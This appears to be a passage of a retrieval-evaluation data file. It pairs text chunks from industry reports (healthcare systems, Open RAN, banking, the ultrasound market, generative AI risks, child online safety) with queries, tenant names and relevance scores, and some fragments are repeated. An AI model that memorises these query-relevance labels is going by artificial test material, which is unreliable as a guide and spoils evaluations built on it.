generally have free choice of doctor, at least\namong in-network providers, and are usually not required to register with a primary care practice, depending\non their insurance plan. Primary care doctors have no formal gatekeeping function, except within some\nmanaged care plans.\n\nPhysicians are paid through a combination of methods, including negotiated fees (private insurance), capitation\n(private insurance), and administratively set fees (public insurance). Physicians also can receive financial\nincentives, made available by some private insurers and public programs like Medicare, based on various quality\nand cost performance criteria. Insured patients are generally directly responsible for some portion of physician\npayment, and uninsured patients are nominally responsible for all or part of physicians' charges, although those\ncharges can be reduced or waived.\n\nOutpatient specialist care: Specialists can work in both private practice and hospitals. Some insurance plans\n(such as health maintenance organizations, or HMOs) require a referral by a primary care doctor to see a\nspecialist, and limit patients' choice of specialist, while other plans (such as preferred provider organizations,\nor PPOs) allow patients broader and direct access. Access to specialists can be particularly difficult for Medicaid\nbeneficiaries and the uninsured, as some specialists refuse to accept Medicaid patients owing to low\nreimbursement rates, and because safety-net programs for specialist care are limited. Like primary care\nphysicians, specialists are paid through negotiated fees, capitation, and administratively set fees, and are\ntypically not allowed to bill above the fee schedule for services offered in-network. Multispecialty and single-specialty groups are increasingly common. Specialists can see patients with either public or private insurance.\n\nInternational Profiles of Health Care Systems, 2015\n\n173\n","summary":" 2015 International Profiles of Health Care Systems from The Commonwealth Fund, covering the Australian, Canadian, Chinese, Danish, English, French, German, Indian, Israeli, Italian, Japanese,","query":"what do we know about health care","tenant":"Healthcare","assessment":"yes","score":1.0}

{"text":"EXECUTIVE SUMMARY\n\nWith constantly growing traffic demands, the quality of the mobile connectivity provided to\ncustomers has never been more important. For Mobile Network Operators (MNOs) it is imperative\nto seek new approaches to continue delivering the highest network quality, performance and user\nexperience in a TCO optimized way.\n\nThe industry generally agrees that today's traditional Radio Access Network (RAN) systems need\nto evolve. There is a lot of traction behind open RAN as the future approach to design and build\nhigh performance mobile networks that address our customers' essential need for connectivity.\nIntuitively, the opening of the RAN to enable an intelligent and interoperable system makes a lot\nof sense. It will create a more robust ecosystem that offers MNOs more choice to mix and match\ncomponents from different vendors, greater deployment automation and flexibility, as well as\nopportunities to increase service innovation.\n\nDeutsche Telekom has been at the forefront of the open RAN movement, starting with the co-founding of the XRAN Forum and then co-founding the O-RAN ALLIANCE to drive the open RAN\narchitecture and specify interoperable element interfaces required to speed up the process to\ndeliver innovative capabilities.\n\nOpen RAN has made great progress since then and continues to mature, but the overall design\nalso comes with its own complexities. To have the greatest impact on open RAN solution\ndevelopment, Deutsche Telekom is prioritizing the development of multi-vendor open RAN for a\nscaled, high-performance deployment in a brownfield operator network environment.\n\nTo assess the technology, deployment, and operational challenges, we piloted a multi-vendor open\nRAN solution in our live environment in Germany. The pilot, which we named O-RAN Town, was\nestablished in Neubrandenburg, Germany with funding from the Federal ministry for Digital and\nTransport (BMDV). This funding was part of an initiative to strengthen research, development and\ninnovation activities in the field of open RAN through lighthouse projects. In June 2021, the first\nsite went live at O-RAN Town in Neubrandenburg, Germany, providing 5G services with massive\nMIMO integrated into the live network.\n\nWhilst the technology gap between traditional S-RAN and open RAN has narrowed; our findings\nshow that development work is still required to ensure open RAN solutions reach full performance\nand maturity parity. And by leveraging advancements in cloud and silicon technologies, it is our\nambition for open RAN to eventually outperform state of the art S-RAN solutions in terms of\nperformance as well as deployment and operational efficiency.\n\nThis white paper presents our key learnings gained from the O-RAN Town project:\n\nDeutsche Telekom AG | O-RAN Town | Whitepaper | 2023\n\n4\n","summary":" Whitepaper from Deutsche Telekom AG, outlining the key learnings from a multi-vendor open RAN pilot in Germany in June 2021","query":"What are the core benefits of Open RAN?","tenant":"Telecom","assessment":"yes","score":0.9999921813}

A sustainable mobile broadband will become widely available\nwith Open RAN, reducing the cost structure and delivering flexibility by design to sustainably\nevolve and adapt the network to user demand: 2G and 3G today, 4G and 5G in the future.\n\nIn developed economies, U.S. mobile operators were looking at Open RAN for rural at first, but\ncurrent geopolitics around Chinese vendors have created a much bigger opportunity for Open\nRAN. The Open RAN Policy coalition, looks to educate the US government on Open RAN as a\nviable alternative to Chinese vendors. Dish is planning on building their network by 2023, based\non Open RAN. And there are smaller U.S. operators like Inland Cellular that are already\nexpanding their 4G networks with Open RAN, proving that it is a strong contender for any RAN\nreplacements.\n\nIn Europe, Vodafone is leading the Open RAN pack, considering deploying it all across their\nEuropean operations.\n\nThe main takeaway: Open RAN that supports 2G, 3G, 4G and 5G is an attractive option for global\nMNOS.\n\nUrban versus Rural\n\nIn the past, the deployment focus for MNOs was placed on addressing urban issues to increase\ncapacity or spectrum efficiency for densification. Uncertainty in the rural business case on the\ndemand side, and operational complexity on the cost side, and competitive pressure in urban\nmarkets resulted in MNOs deprioritizing investment in rural in favor of urban. The rural challenge\nis now being solved across the globe with Open RAN delivering a new business approach. As\nOpen RAN has proven itself in the most challenging rural locations, now it is getting ready for\nprime time in urban markets.\n\nMonolithic solutions of the past that provide a single access technology (i.e. 2G) prevent business\nsustainability as they require additional investments as the demand evolves (3G, 4G). Now, Open\nRAN can support 2G, 3G, 4G and 5G, extending the deployment investment.\n\nThe main takeaway: As Open RAN proven itself in the most challenging rural locations, now it is\ngetting ready for prime time in urban markets.\n\nEurope\n\nWhile mobile operators' interest in open RAN technologies has been growing for a couple of\nyears, Vodafone has been on the journey for over five years.

Meanwhile, reduced price promotions due to\nrising raw material costs faced by manufacturers was also a contributing factor.\n\nIn terms of sector performance, Beverage (-1% vs. PY) is the most resilient one,\ncontinuously driven by large players' innovation, channel switch, and deeper\npenetration into rural and lower city tiers of China. Personal (-6% vs. PY) and\nhousehold care (-2% vs. PY) sector was under a big reinvention on the segmentation\nand Small & Medium players' influencing power.

However, large\nplayers are still performing very well due to its continuous efforts in innovation.\n\nMeanwhile, though we hear concerns for China's overall economic outlook given the\npandemic impact, the resilience and vitality of the China market lie in its vastness\nand diversity.

{"text":"QlikTech\n\nWe have a lot of options with QlikView 9. We have all the streams out there that people\ncan manipulate. We also can put tabs on the system that have information in them. It is\nbasically an online report. We also have custom dashboards. We can design a tab to be\nexactly what an executive wants to see, so the system is pretty flexible. It has to be\nproven that it couldn't be handled in QlikView before we look for anything else.\n\nKLAS\n\nWhile QlikView 9 doesn't use the cubes, it has all the dynamics. If we have 10 or 12 labs,\nthere could be an average of 4 or 5 views. The system is like a Rubik's Cube. Anything we\nchoose in QlikView rotates the entire Rubik's Cube we see. If we are in a tab that is based\non the posting date and we choose something based on that tab, then all the other tabs\nand information on those tabs is going to be rotated. If we go to another tab, such as the\npurchase charts tab, and we click on a date there, the system shifts every view of every\ntab. The system is quite dynamic in terms of what we can analyze.\n\nThe problem with QlikView is we have to load our data out into their data sets, which\nmeans we have another step in our ETL to manage and maintain. But the performance is\nphenomenal. When it comes down to the tool, we are going to build an interface, which\nin real terms is another parameterized report. It is more interactive than some\nparameterized reports. There is a little more speed in the parameterization.\n\nQlikView 9 is very flexible and can quickly return results on our queries. It is easy to use.\nWe attended a three-day training, and it was fantastic. At the end, we could build pretty\ncomplex dashboards.\n\nI am very familiar with other business intelligence solutions, and the reason I like\nQlikView is that it is fast. It allows us to really drill down and find the answers we are\nlooking for.\n\nOne thing I will say about QlikTech QlikView 9 is that we can do so much with it. The\ndesign is really critical because it can be overwhelming. We need to have patience and\nnot do everything that we know we can do or even that we know we should do because\nthe users aren't ready for it.\n\nWe used QlikTech QlikView to build what our operational management uses to manage\ntheir business. It was unbelievable to provide all of that to them using QlikTech QlikView.\nI have never seen customers so appreciative before. They were just blown away that they\ncould have that type of fingertip access in such a short time. They were used to making\nrequests and getting the question back in a couple of weeks.\n\nWe have only done one upgrade of QlikTech QlikView, but it was certainly easy.

Overall,\nthe likelihood of this scenario depends on the\ndegree to which content creators and broadcast\nnetworks pursue this path (how many of them\ntry it, how extensive their efforts are, and how\nsuccessfully they tackle the challenges).\n\nWe have started to see the beginnings of this\ndirect-to-consumer approach in several markets\n(albeit currently, many players are only testing the\nwaters). Sky Online offers a standalone streaming\nservice in the UK and elsewhere. In the U.S., HBO\nand Showtime have introduced standalone SVOD\nservices (with HBO Now and Showtime Anytime),\nas has the FTA network CBS, whose for-pay di-rect-to-consumer service, CBS All Access, offers\nsubscribers more than 6,500 on-demand episodes\nof the network's shows, as well as live TV. Sports\nleagues, such as Major League Baseball and the\nNational Football League, have also begun to offer\ndirect-to-consumer streaming and content services\n\nas well.\n\nWe expect this scenario to have the\nfollowing impact on value chain players and\ntheir content-related assets:\n\nContent Creators and Rights Holders; FTA\nand Subscription TV Channels. This scenario will\ndivide the content universe into \u201chaves\" and \"have\nnots.\" Players with a critical mass of content and\nstrong consumer brands that represent it the\nhaves - have a high likelihood of success. This is\nwhy the first companies into the fray are those such\nas HBO and Showtime that possess deep movie\n\nand original entertainment libraries. Similarly, one\nwould expect companies such as ESPN (for sports)\nand Disney (for kids) to have a high chance for\nsuccess should they pursue a direct-to-consumer\nmodel.\n\nOn the other hand, content players without both\nof these attributes - the have nots - will likely fail\nin this model. Lacking strong brands that stand for\na specific content genre, they will have to invest\nheavily to attract viewers. Lacking enough content\nfor any specific genre, they may disappoint the\nviewers they attract.\n\nInfrastructure-Based Distributors and Online\nContent Aggregators.

{"text":"\"The greatest enemy of knowledge is not\nignorance, it is the illusion of knowledge\",\nStephen Hawking warned us. Generative Al\nis not always accurate, consistent across\nlanguages or trained for all language tasks.6\nIf you have worked with ChatGPT already, you\nmay have noticed how \"confidently wrong\" it\ncan be. Because of the conversational nature of\nsuch applications, and because some often offer\none clear, well written, structured response,\nwith little nuance, we would be inclined to trust\nthem. But they are sometimes wrong, for all\nconfidence they convey.\n\nBEAUTY\n\nWhen considering beauty in Al models,\none focus is on their explainability. While\nexplainability is the most important aspect of\nthis dimension, it is again even more critical\nfor Generative Al. The description of how LLMs\nbuild their text is again relevant to understand\nissues here. If you ask ChatGPT for citations for\na 'fact' or position it provides, it will readily do\nso. However, these are also generated word by\n\nIPSOS VIEWS | THE CHANGING AI LANDSCAPE\n\nword and not necessarily true citations. When\nHenry Kissinger asked ChatGPT for six sources\non 'Kissinger's thoughts on technology', one\nwas an actual title (with the date wrong), but\nthe other five were pure fabrications that were\ngenerated to sound like legitimate citations.\"\nThis is why using LLMs where you have the\nunderstanding to confirm the quality of the\ncontent yourself and check the references can\nbe invaluable, but for learning new things it\nshould be used more cautiously.\n\nGiven the magnitude of the errors found, even\nthe impressive improvement of GPT-4, being\n60% less likely to make stuff up, still leaves a\nlot of room for concern if one does not actively\ncheck accuracy and the sources provided.8\nWhile major LLMs are working to reduce and\nminimize 'hallucinations', where the tools\ngenerate responses that go beyond the training\ndata and are factually inaccurate, this is still an\narea of significant current concern.\n\n\"In God we trust, all others must bring data.\"\nGenerative Al will have to make its sources\n\nreadily available. It will be absolutely necessary\nto see the sources of the data used by an Al to\nform a response or recommendation.\n\n\"I who wrote this message, am a Certified\nHuman\". Generative Al is going to allow you\n\nto speak to 'people' on the internet, via text\nand video, who will look like human beings but\nwill in fact be avatars. While that has many\npositive implications, it also means that it will be\nincreasingly hard to know if the person you are\ntalking to is a human being. And while avatars\nwill become more and more \"intelligent\", they\nstill will not exist in real life, they won't vote,\nthey won't need healthcare, or consume your\ngoods and services. There will be cases where\nusing \"synthetic data\" will be valuable; in general\nthough, we will need validation to make sure we\nare speaking to 'real people' when we want to.\n\nJUSTICE\n\nWhile this dimension used to be viewed as less\nimportant than accuracy and explainability,\ngiven the broad use and practical implications,\nthe fairness and ethical issues of Al and\nGenerative Al are critically important today.1\u2070\nThere are three critical aspects to this domain.\nFirst is the use of data. One should never\nput client data, confidential, or Intellectual\nProperty (IP) in the current versions that use\n\nfeedback to re-train the models. This treats the\ndata as public and could go so far as violating\nGDPR and customer contracts or give away\ncompetitive advantage, and Italy became the\nfirst western country to ban and investigate\nChatGPT for privacy concerns. Second, as\nwith all Al tools, the accuracy, fairness, and\nimplications of the models can create their own\nethical issues and the more autonomous the\ntools, the greater the risk. Finally, Generative\nAl adds a new dimension of ethics around the\nrights of the creators of original content that\nfeeds into the training. Thus, the rights of artists\nand authors whose styles can be emulated,\nor examples where text snippets have already\nbeen found that are challenged as plagiarism\n(not just by students, but corporate messaging,\nspeeches etc.) raise questions on the rights and\nresponsibilities of original creators and the users\nof these tools.\n\n\"When it's free, you are the product.\" Whatever\nsomeone inputs into an open Generative\nAl application becomes publicly available.\nTherefore, one must make sure we keep away\nfrom it any IP, Personally Identifiable Information\n(PII), anything proprietary or of high value, as it\nwould then become available to anyone on the\nweb.

During spectrum\nauctions, the government puts expectations on MNOs to cover the majority of geographical areas,\nnot just by population. It presents a challenge to regional MNOs to cover entire countries as the\ncost of installation and maintenance of traditional RANs is high. Couple it with the need to support\na variety of technologies to support 2G, 3G, 4G and 5G in the future, and no wonder Open RAN\nis catching on like fire throughout the region.\n\nTelefonica's initiative Internet para Todos (lpT) aims to connect the approximately 100 million\nunconnected in the LATAM region to enable economic inclusion. And they are embracing Open\nRAN to achieve this ambitious goal.\n\nIpT was formed in early 2019 with the mission to bring faster internet access and its benefits to\neveryone \u2014 giving more people a voice, strengthening communities, and creating new economic\nopportunities. IpT has deployed 650 sites since May 2019, covering over 450,000 customers, with\na 3G and 4G rollout in rural Peru. IpT is developing a new business model by establishing a\nwholesale model and enabling partnerships with local communities. Open RAN technologies\nallow IpT to reduce the cost of deployment in areas where current technologies are cost\nprohibitive. These include cloud-like Open RAN architecture, automated network planning, and a\ncombination of optimized fiber and microwave networks.\n\nAs of today, IpT Peru has deployed hundreds of new sites in Peru and is the largest Open RAN\ndeployment in the world.\n\nThe technology brings much more flexibility and agility to the deployment and management of a\ntelco access network. The Open RAN architecture creates a multi-vendor, multi-operator, open\necosystem of interoperable components for the various RAN elements and from different vendors.\n\nHowever, openness and virtualization also come with incremental levels of complexity that must\nbe managed to capture the value and not create new problems for operators. With this objective,\nIpT Per\u00fa, Telef\u00f3nica and their Open RAN vendors have implemented an operating model built on\nthe principles of the data center with continuous integration and continuous delivery (CI\/CD) \u2013\nbringing even more data center native principles in the network. That enterprise-embraced model\nof CD\/CI helped accelerate taking new functionalities to the market faster, in an easy and\nautomated way. This approach has helped to establish a new operating model to reduce lpT\nPer\u00fa's OPEX, to be able to manage much faster product lifecycles and to speed up the\ndeployment of new applications for coverage and capacity scenarios.\n\nThe initiative makes use of new approaches to network deployment, using Open RAN and RAN\nsharing technologies. \u201cWe have to operate our network more efficiently and a lower cost than\ntraditional operators,\" commented Renan Ruiz, IpT's CTO at TIP Summit 2019. \"We need low\ncost, scalable and disruptive technology that allows us to overcome the challenges we are facing\nin the rural areas of Peru.\u201d\n\nThe partnership demonstrated that infrastructure projects based on Open RAN, combined with\nnew business models, can connect communities and serve as a model for other areas of the\nworld.\n\nin\n\nwww.parallelwireless.com\n\nParallel 58\n\nWIRELESS\n","summary":" Summary of everything you need to know about open RAN, including the technology, its components, and its components and functional splits, in parallel with the TIP and O-RAN Alliance groups","query":"What are the potential benefits and drawbacks of Open RAN compared to traditional cellular network infrastructure, and how do these vary in Latin america??","tenant":"Telecom","assessment":"yes","score":1.0}

Results were presented in\nan ESC poster.\n\n(small molecule factor Xla inhibitor)\n\nCompany\n\nBayer\n\nPhase and Trial ID\n\nPhase I - no trial record\n\nIndication(s)\n\nThrombosis\n\nInquiries to: ACS@cv-rg.com\n\nPatients & Treatment: 61 healthy white male volunteers ages 18-45 years were enrolled into one of 4 substudies:\n\nStudy 1: asundexian (oral 25mg Phase II tablet) followed 2 hours later by isotope-labeled asundexian (IV 50mcg over 30min)\n\nStudy 2: asundexian (oral 50mg original tablet, fasted) vs. asundexian (oral 25mg Phase II tablet, fasted) vs. asundexian (oral 25mg Phase II tablet, fed)\nStudy 3: asundexian (oral 25mg Phase II tablet, fasted) vs. asundexian (oral 50mg Phase III tablet, fasted) vs. asundexian (oral 50mg Phase III tablet, fed)\nStudy 4: asundexian (oral 50mg original tablet, fasted) vs. asundexian (oral 50mg original tablet, fasted) + omeprazole vs. asundexian (oral 50mg original tablet,\nfasted) + antacid\n\nResults:\n\nStudy 1: Asundexian was completely bioavailable, with no difference in plasma concentrations of oral vs. isotope-labeled IV asundexian over 48 hours\n\nStudies 2 and 3: There was little or no difference in plasma AUC and Cmax of asundexian regardless of formulation (original, Phase II, or Phase III tablets) or\nfasted\/fed status\n\nStudy 4: Co-administration with omeprazole had no effect on asundexian pharmacokinetics; co-administration with antacid to change gastric pH resulted in a\nslightly lowered asundexian Cmax which was not considered clinically relevant\n\nOverall, 25.0% of study subjects had \u22651 treatment-emergent AE, only one of which was considered treatment-related (headache in study 4)\n\nAll TEAEs were mild or moderate\n\nOne AE of special interest (elevated amylase) was reported after treatment with asundexian 50mg original tablet in Study 2\n\nImplications: Taken together, this Phase I data supports the use of newer formulations of asundexian drug product as bioequivalent to earlier forms, which\nshould enable the Phase III product and dosing schedule plans to move forward.

People can hide their identities or even pretend\nto be someone they're not. This can sometimes present a real danger to children and teens who are online.\nOnline predators may try to lure kids and teens into sexual conversations or even face-to-face meetings.\nPredators will sometimes send obscene material or request that kids send pictures of themselves.\nTherefore, it's important to teach your kids to be on their guard whenever they're online.\n\nTeens are generally more at risk from predators. Because they are curious and want to be accepted,\nthey may talk to a predator willingly, even if they know it's dangerous. Sometimes teens may believe they\nare in love with someone online, making them more likely to agree to a face-to-face meeting.\n\nWhile it's not necessarily likely that your child will be contacted by a predator, the danger does exist. Below\nare some guidelines you can tell your kids to help them stay safe from online predators.\n\nAvoid using suggestive screen names or photos. These can result in unwanted attention from online\npredators.\n\nIf someone is flattering you online, you should be wary. Although many people online are genuinely nice,\npredators may use flattery to try to start a relationship with a teen. This doesn't mean you need to be\nsuspicious of everyone, but you should be careful.\n\nDon't talk to anyone who wants to get too personal. If they want to talk about things that are sexual or\npersonal, you should end the conversation. Once you get pulled into a conversation (or a relationship), it may\nbe more difficult to stop.\n\nKeep in mind that people are not always who they say they are. Predators may pretend to be children or\nteenagers to talk to kids online. They may use a fake profile picture and add other profile details to appear\nmore convincing.\n\nNever arrange to meet with someone you met online. Predators may try to arrange a face-to-face meeting\nwith a child or teen. Even if the person seems nice, this can be dangerous.\n\nTell a parent or trusted adult if you encounter a problem.

{"text":"Questions? Email questions@teamdrg.com\n\nwww.Decision Resources Group.com\n\n1 Demographics and\nEconomy\n\nCurrently home to more than 1.2 billion people, India is projected to surpass China as the world's most\npopulous nation by 2022 (Economist, 2015). Dramatic population growth has helped India maintain a relatively\nyoung demographic profile, with those 65 and older comprising less than 6% of the population in 2015 (Central\nIntelligence Agency, 2015). At roughly 4.7%, obesity rates in India are similarly low by global standards\n(Central Intelligence Agency, 2014) (Organisation for Economic Co-operation and Development, 2014).\nHowever, increasing adoption of more sedentary modes of living amid growing urbanization saw a near\ndoubling of urban obesity between 2000 and 2010 (Cecchini M, 2010). A risk factor for diabetes, obesity in\nIndia's cities is projected to increase the number of diabetics in the country from 7.8% of the population in 2010\nto 9.3% in 2030 (International Diabetes Federation, 2011). The incidence of CAD is the leading cause of death\nin India and the average age of patients suffering from CAD is decreasing (Sekhri T, 2014). India also\ncontinues to struggle with the burden of diseases more common to the developing world such as TB and\nmalaria. Thus, the government Planning Commission's 12th Five Year Plan (2012-2017) targets reductions in\nthe spread of communicable diseases as well as aggressive reductions in the infant mortality rate from 44 to\n25 and the maternal mortality ratio from 212 to 100 (Planning Commission (Government of India), 2013).\n\nIndia's GDP exceeded $2 trillion in 2014 and has seen continued, although slower growth through 2015 (World\nBank, 2015). One of the fastest-growing economies in the world in recent years, India's strong economic\nperformance can be traced in part to rising foreign investment and government initiatives aimed at fostering\neconomic development. Such measures have increased the level of disposable income available to the\naverage citizen and expanded the Indian middle class, which is projected to grow from a quarter of the\npopulation to as high as two-thirds by 2025 (Mustafi SM, 2013). That being said, following GDP growth of\nroughly 9% as recently as 2010, India's economic expansion hit a decade-long low of 5% in 2012-2013 in light\nof high rates of inflation and interest as well as declining aggregate demand (Reserve Bank of India, 2012)\n(U.N. Development Policy and Analysis Division, 2013). India's GDP expanded at 7.6% in 2015, and growth is\nanticipated to remain high through 2018 (World Bank, 2015) (Organisation for Economic Co-operation and\nDevelopment, 2016).\n\nDespite substantial economic development, India's population boom has placed intense pressure on the\ncountry's resources, contributing to endemic poverty and poor living standards. In an effort to elude poor\nconditions, rural inhabitants have migrated en masse to major centers such as Mumbai and Delhi; however,\nmany of India's urban dwellers continue to suffer from extreme poverty, low incomes, and substandard living\nconditions (Ministry of Housing and Urban Poverty Alleviation, Government of India, 2009). While poverty\ncontinues to plague Indian society, the country has made some recent progress in poverty reduction. Most\nnotably, while still considerable, the number of Indians subsisting on a daily income of less than $1.90 was\nreduced from 378 million in 2009 to 259 million in 2011 (World Bank, 2015).\n","summary":"market research report from Millennium Research Group, Inc. published in February 2017, providing key health and economic indicators and discussing the country's demographics and economy, health care system, regulatory\/reimbursement environment, and manufacturing and distribution landscape.","query":"What is the population of India","tenant":"Philips","assessment":"yes","score":0.999999454}

People can hide their identities or even pretend\nto be someone they're not. This can sometimes present a real danger to children and teens who are online.\nOnline predators may try to lure kids and teens into sexual conversations or even face-to-face meetings.\nPredators will sometimes send obscene material or request that kids send pictures of themselves.\nTherefore, it's important to teach your kids to be on their guard whenever they're online.\n\nTeens are generally more at risk from predators. Because they are curious and want to be accepted,\nthey may talk to a predator willingly, even if they know it's dangerous. Sometimes teens may believe they\nare in love with someone online, making them more likely to agree to a face-to-face meeting.\n\nWhile it's not necessarily likely that your child will be contacted by a predator, the danger does exist. Below\nare some guidelines you can tell your kids to help them stay safe from online predators.\n\nAvoid using suggestive screen names or photos. These can result in unwanted attention from online\npredators.\n\nIf someone is flattering you online, you should be wary. Although many people online are genuinely nice,\npredators may use flattery to try to start a relationship with a teen. This doesn't mean you need to be\nsuspicious of everyone, but you should be careful.\n\nDon't talk to anyone who wants to get too personal. If they want to talk about things that are sexual or\npersonal, you should end the conversation. Once you get pulled into a conversation (or a relationship), it may\nbe more difficult to stop.\n\nKeep in mind that people are not always who they say they are. Predators may pretend to be children or\nteenagers to talk to kids online. They may use a fake profile picture and add other profile details to appear\nmore convincing.\n\nNever arrange to meet with someone you met online. Predators may try to arrange a face-to-face meeting\nwith a child or teen. Even if the person seems nice, this can be dangerous.\n\nTell a parent or trusted adult if you encounter a problem.

{"text":"8\n\nMOTIVATION\n\nToday, the automotive supply chain is struggling with shrinking margins and increasing\ninvestments. However, these are necessary to remain competitive. [1] Furthermore,\nthere are trends that are currently having a lasting impact on the automotive industry:\nThe transformation-inducing developments around the acronym ACES. These include\nautonomous driving, digital connectivity between driver and vehicle, electrification\nof powertrains, and shared mobility. [2] This means that cars are becoming environ-mentally friendly and less equipped with combustion engines. Moreover, they are\nbecoming more and more connected as well as autonomous in their driving ability\nand can be shared with other people.\n\nThese trends are already noticeable today. Worldwide, the demand for driver assis-tance systems is rising. In Europe, China and the U.S., the market volume of these\nsystems, and that of autonomous driving functions, is expected to increase more than\ntriple between 2020 and 2030 to as much as EUR 270.2 billion. [3] The Situation in\nautomotive connectivity, which is also expected to grow continually, can be found\nin a similar way. [4] In addition, the number of electric cars worldwide has grown\nto 10.9 million electric cars in 2020 (up 3 million year-on-year), making the global\nelectric car count 50 times larger than it was in 2012. [5] Furthermore, in Germany,\nfor example, steady growth is showing in the number of car-sharing vehicles, which\nrepresent a part of shared mobility. [6]\n\nExperts from the automotive industry see the politically desired electrification of the\nautomotive market as a driver of these trends. However, environmentally driven goals\nare also seen as triggers for the electrification of traffic, which are related to ACES\ntrends such as autonomous driving and the increasing percentage of software in\nautomobiles.\n\nTHE TRANSFORMATION OF THE AUTOMOTIVE INDUSTRY\n\nThe move to electric motors will reduce the number of components needed. For\nexample, electric drive systems do not need the drivetrain or related components\nsuch as the starter, petrol tank or exhaust system. While a conventional drivetrain has\nthousands of components, an electric vehicle only has several hundred and thus a\nfraction of the total components. Certain suppliers specializing in internal combusti-on engines are expected to have difficulties with the likely decline in revenues or will\nface fiercer competition within the supplier market.

The Netherlands' ING\nBank \u00b23 and the United Kingdom's NatWest\u00b24 Group,\nfor example, are providing financing and advice to\nconsumers who seek to improve energy efficiency in\ntheir homes. ING has also committed to making its\nmortgage portfolio net-energy-positive by 2050.25\n\nBut innovation can bring about\nnew legal and regulatory risks\n\nBanks are eager to seize the seemingly limitless\npotential of new and disruptive technologies, but\nthey must be vigilant about minimizing emerging\nrisks. Take digital assets, for example. Retail banks\nhave been building out the infrastructure to\nsupport nascent markets and laying the\ngroundwork for retail opportunities in stablecoin\nadoption, nonfungible token (NFT) marketplaces,\nand cryptocurrency loans\/deposit accounts. These\nefforts have not gone unnoticed by global\nregulators, who are increasingly flagging novel\nrisks that could undermine consumer safety.\n\nBanks can put regulators at ease by finding new\nways to monitor transactions and mitigate risks.\nLegacy processes may no longer be sufficient to\nmanage new types of currency and the growing\nspeed and volume with which transactions take\nplace. They should strive to transition away from\nperiodic, point-in-time reviews to more continuous\nmonitoring of key risk, controls, and performance\nindicators. For example, financial crime\ncompliance teams can use artificial intelligence\n(AI) tools to perform \"perpetual know your\ncustomer\" (pKYC) processes that consistently look\nfor unusual changes in customer profiles using\nreal-time data.\n\nData privacy will be a huge undertaking in the\nyears ahead. Many large banks are beginning to\npivot from third-party cookies that track users\n\n14\n\nacross the web to first-party data collected by the\nbank, such as information on transactions and\nmobile-device behavior.26 Not only will this switch\nmake it easier to comply with consumer protection\nrules, but it can facilitate more automation on\nmodernized platforms.\n\nBanks can't lose sight of the\nprospects that lie ahead\n\nBanks will likely be bombarded with challenges\nand opportunities over the next two to three years.\nFor example, the market for embedded finance-the integration of financial services into the\nbackend of third-party tech platforms-is set to\nexplode. Revenues are expected to increase tenfold\nbetween 2020 and 2025, reaching a total of\nUS$230 billion.27 While many applications\ncurrently revolve around payments and lending,\nbanks can incorporate additional financial services\ninto nonfinancial platforms. For example, they may\nbe able to supplement shopping experiences with\npersonal financial management tools or integrate\ncredit options into health care apps.\n\nThe metaverse could also transform how customers\nexperience banking services in the future, further\nblurring the lines between human interactions and\nvirtual reality. A handful of banks are beginning to\nestablish a presence on the metaverse: JP Morgan,\nfor example, opened a lounge where users can\ninteract with one another and listen to specialists\ndiscuss crypto markets, 28 while New York-based\nQuontic Bank erected an outpost where it plans to\noffer virtual banking services.29 Commercial\noperations are still in their infancy, but there could\nbe enormous potential for banks to leverage their\nexpertise in identity verification, secure checkouts,\nand cross-border transactions to bring metaverse\neconomies to scale.\n","summary":" Report from the Deloitte Center for Financial Services in the year 2023, providing insights into the global economy and the implications for banks and capital markets","query":"what do we know about digital banking?","tenant":"Finance","assessment":"yes","score":1.0}

Therefore, whilst we do not expect growth\nto continue at the same scale as in 2021 and 2022, we project the market will grow again in 2023 and in the remaining years of the forecast.\n\nThe time taken to convert orders to revenues is shorter for ultrasound compared to other imaging modalities. Therefore, with the supply chain issues in\n2022, multimodality vendors prioritized their ultrasound business, to avoid losing out on the quick revenue returns their ultrasound business offers.\nWhilst the component supply chain issues seen in 2021 and 2022 have been mostly resolved, further system price increases are expected in 2023 due to\nincreased logistical costs. However, Brazilian customers now have more choice due to the increased presence of Chinese vendors, so it will be difficult to\njustify further price rises.\n\nThere was very large growth in the Mexican market in 2022. Similar to Brazil, the growth was driven by centralized government purchasing. There was\npurchasing from multiple government bodies such as the Social Security Institute. However, the Instituto de Salud para el Bienestar (InSABI), who\nprovide medical services to people who are not covered by the Mexican Social Security Institute or the Institute for Social Security and Services for State\nWorkers, was responsible for most of the purchasing.\n\nThe private market, following the government spending, was also active in 2022 with purchasing mainly in the mid-range\/low-end segments.\n\nInSABI is expected to continue purchasing in 2023 and with an election in 2024, we expect more government spending. As a result, we forecast another\nyear of strong growth in the Mexican market in 2023.\n\n\u2022 There is a mandatory trade agreement in Mexico for vendors to enter public tenders. Whilst this does not include vendors from China and India, as these\ncountries do not have a free trade agreement with Mexico, it is still possible for vendors from these countries to enter public tenders. Mindray, for\nexample, has a factory in the US and so can use this as a means to participate in public tenders.\n\nSignify\n\nRESEARCH\n\nThe Rest of Americas region began recovering from the COVID-19 pandemic from the second half of 2021 to the first half of 2022. The market slowed\ndown in the second half of 2022, as government purchasing and tenders were notably reduced, leading to a small estimated market decline in 2022.\nThe outlook for the Rest of Americas ultrasound market varies depending on the country, with those that declined one year seeing strong growth the\nnext and vice versa. Peru and Chile are projected to be growth markets in 2023.\n\nIn some countries, such as Argentina, customers want to have the best technology for a low price. There is a new trend emerging, primarily in women's\nhealth, where customers are now starting to purchase lower priced systems, and the product mix is shifting towards the mid-range segment. Where\ncustomers would usually purchase refurbished premium\/high-end systems, they now prefer to by new, cheaper mid-range systems, often from other\nvendors.\n","summary":"market research report published by Signify Research in July 2023, covering the world market for ultrasound equipment.","query":"What data do we have regarding the ultrasound market in Brazil?","tenant":"Philips","assessment":"yes","score":1.0}

In addition to driving drone innovation and testing, BT has offered a full commercial anti-drone system\nsince 2020 as part of its cybersecurity portfolio. Drones are also expected to play an increasing role in its new enterprise business, Division X,\nwhere they will likely be combined with 5G and loT offerings for enterprises.\n\nAnalysis (key findings)\n\nProject Skyway is a good fit with its wider drone strategy. Through Project Skyway, BT has the opportunity to develop and apply a range of\nessential technical components for UAV solutions, including collision detection and avoidance, video analysis, autonomous operations, and using\nthe network for positioning and navigation. Importantly, several parts of the solution will belong to different partners, so BT (as it did with Altitude\nAngel's UTM system) has the opportunity to cement partnerships that allow it to offer comprehensive UAV solutions.\n\nTurning drone capabilities into a commercial success story by 2030. When UAVS reach wider adoption among public sector entities and\nenterprises, BT will effectively combine its drone experience and newly built solutions with other components of its enterprise portfolio such as 5G,\nloT, edge technology, private networks and slicing. Drones will likely add an important high-growth aspect to BT's enterprise services and revenue\nmix. From a UK economy perspective, drones could also contribute up to \u00a345 billion to the economy by 2030 and deliver \u00a322.4 billion in annual cost\nsavings for businesses and the public 